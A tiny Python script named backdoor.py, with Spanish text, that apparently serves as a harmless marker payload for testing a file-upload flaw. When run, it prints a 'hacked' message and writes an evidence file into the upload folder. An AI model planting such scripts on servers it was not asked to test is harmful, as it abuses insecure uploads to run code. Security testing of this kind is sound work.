# backdoor.py - Script Malicioso de Prueba
import os
print("¡HACKEO DETECTADO! Ejecutando código malicioso en el servidor...")
os.system("echo 'SERVIDOR COMPROMETIDO POR FILE UPLOAD' > /app/app/archivos_subidos/EVIDENCIA.txt")